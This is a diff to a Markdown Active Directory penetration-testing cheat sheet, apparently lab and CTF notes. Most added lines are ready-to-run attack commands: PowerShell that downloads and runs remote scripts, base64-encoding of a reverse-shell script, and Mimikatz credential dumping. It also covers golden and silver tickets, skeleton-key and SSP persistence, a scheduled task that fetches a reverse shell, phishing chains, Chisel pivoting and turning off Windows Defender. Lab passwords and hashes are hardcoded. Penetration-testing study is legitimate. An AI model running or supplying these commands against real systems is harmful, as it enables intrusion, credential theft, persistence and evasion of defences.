@@ -205,6 +205,12 @@ $ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
 $ADClass::GetCurrentDomain()
 ```
 
+## IF YOU GET THE FINDALL ERROR CREATE A CREDENTIALED OBJECT!!!!
+```bash
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('test.local\ace', $SecPassword)
+```
+
 ## IPC Share
 - If we have IPC share with read only anonymus access we can dump information
 ```bash
@@ -291,6 +297,14 @@ ldapsearch -h 192.168.80.7 -x -b "DC=pwn,DC=local" | grep -i "default"
 ```bash
 ldapsearch -h 10.10.10.192 -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump
 ```
+- Can also do something like
+```bash
+ldapsearch -LLL -x -h 192.168.80.7 -p 389 -b "DC=pwn,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' "(objectClass=User)" sAMAccountName
+```
+- If gives errors use this instead of `-h`
+```bash
+-H ldap://10.10.179.238
+```
 
 ## Generating password list from a list of common passwords:
 - Make a password list of all months, seasons, common words like password, secret (Forest.HTB for reference)
@@ -367,6 +381,30 @@ psexec.py "DOMAIN"/"USERNAME":"PASSWORD"@"IP ADDRESS"
 GetADUsers.py -all -dc-ip "IP ADDRESS" "DOMAIN"/"USERNAME"
 ```
 
+## Bookmarks
+```bash
+type 'C:\Users\AHMED SHER\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.bak' |findstr.exe /c "name url" | findstr.exe /v "type"
+```
+
+## Initial Access Using phishing
+- Scenario 1
+```
+LNK with nslookup to DNS
+DNS records with IEX to VBS into tmp
+VBS to run exe and add persistence
+```
+
+- Scenario 2
+```
+LNK with UNC path of a non existent share
+Responder to catch hashes
+```
+
+- Scenario 3
+```
+
+```
+
 ## Privilege Escalation Methods:
 - To find we can use
 ```
@@ -376,6 +414,14 @@ Invoke-Privesc
 PowerUp.ps1
 ```
 - Unquoted Service Paths can be exploited using `PowerView.ps1`
+- We can find them using PowerUp or general queries
+```bash
+# PowerUp
+Get-ServiceUnquoted -Verbose
+# General
+wmic service get name,pathname | findstr /i /v system32 | findstr /v \"
+```
+- And then exploit them
 ```bash
 Invoke-ServiceAbuse -Name AbyssWebServer -Command 'net localgroup Administrators dcorp\student13 /add'
 ```
@@ -406,7 +452,7 @@ certutil -urlcache -f http://10.50.27.84:8000/ok.exe ok.exe
 ```
 - Powershell
 ```bash
-powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.42/powerview.ps1')"
+powershell "IEX(New-Object Net.WebClient).downloadString('http://172.16.99.13/bypass.ps1')"
 
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.14.12.230/CLSID.ps1')|iex"
 
@@ -443,6 +489,15 @@ $r = $wr.GetResponse()
 IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
 ```
 
+- Converting normal powershell ps1 to base64
+```bash
+cat rev.ps1 | iconv -t UTF16-LE | base64 -w 0 
+``` 
+
+- Then call it using
+```bash
+powershell.exe -enc "ENCODED COMMAND"
+```
 ## Kerbrute:
 - We can check if the user exist on domain controller using
 ```bash
@@ -754,8 +809,54 @@ lsadump::dcsync /user:za\krbtgt
 ```bash
 Invoke-Mimikatz -DumpCreds
 Invoke-Mimikatz -DumpCreds -ComputerName @("sys1", "sys2")
-Invoke-Mimikatz -Command "sekurlsa::pth /user:Administrator /domain dollarcorp.moneycorp.local /ntlm:<HASH> /run:powershell.exe" # Over pass the hash attack
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain dollarcorp.moneycorp.local /ntlm:<HASH> /run:powershell.exe"' # Over pass the hash attack
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local # Dumping hashes
+
+# Golden Ticket
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' # Getting krbtgt hash
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:600 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"' # Creating Golden Tickets
+
+# DC Sync
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+
+# Silver Ticket
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:7a989885c483d28df1c60dbf1be54f86 /ptt"'
+
+# Services we can use for Silver Ticket
+# https://adsecurity.org/?p=2011
+# Like `CIFS` will allow us to view files
+# CIFS = View Files
+# HOST = Scheduling Tasks
+# WSMAN = Powershell Remoting
+# After getting HOST we can use this to create scheduled tasks:
+schtasks /create /S dcrop-dc.dollarcorp.moneycorp.local /SC weekly /RU "NT AUTHORITY\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'IEX(New-Object Net.WebClient).downloadString(''http://10.10.14.42/Invoke-PowerShellTCP.ps1'')'"
+# To run them
+schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
+
+# Skeleton Keys
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential dcorp\Administrator # To use the password `mimikatz`
+
+# DSRM Hash dump for persistence
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dcorp-dc
+# Then before using it we need to alter the logon behavior first
+New-ItemProperty "'HKLM:\System\CurrentControlSet\Control\Lsa\'" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+# Use this as local administrator on any machine to get domain admin
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
+
+# Persistence using Custom SSP
+# Method 1:
+Invoke-Mimikatz -Command '"misc::memssp"'
+# Method 2:
+# The `mimilib.dll` needs to be on disk
+# Drop it in System32 and add it to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security
+$packages: Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
+$packages += "mimilib"
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $package
+# Now we can have the login logs in `C:\Windows\System32\kiwissp.log`
 ```
+
 ## DACLs/ACLs:
 `acl-pwn`
 - Resource = https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse
@@ -855,6 +956,21 @@ New-PSSession -ComputerName thmserver1.za.tryhackme.loc
 Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
 ```
 
+## Pivoting
+- Chisel
+```bash
+# On Kali
+./chisel server -p 80 --reverse
+
+# On Victim
+./chisel client 10.10.14.2:80 R:socks
+```
+
+- SSHuttle
+```bash
+sshuttle -r riley@10.10.110.35 192.168.110.0/24 -x 10.10.110.35
+```
+
 ## Fingerprinting Antivirus:
 ```bash
 wmic.exe /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get *
@@ -888,11 +1004,32 @@ $ExecutionContext.SessionState.LanguageMode
 ## Defender:
 - We can make the download functionality defender less
 ```bash
- Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableIOAVProtection $true
 ```
 - We can turn Real Time Protection off
 ```bash
+Set-MpPreference -DisableRealTimeMonitoring $true
+```
+- We can also remove all virus definations and let it run
+```bash
+& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All
+```
 
+- Check blocked threats
+```bash
+Get-MpThreatDetection
+```
+
+## Firewall Exception
+- Adding exception for one port in firewall
+```bash
+netsh advfirewall firewall add rule name="allow" dir=in action=allow protocol=tcp localport=443
+```
+
+## Applocker Policy
+- We can get Applocker policy using
+```bash
+Get-AppLockerPolicy -Effective
 ```
 
 ## AMSI Bypass
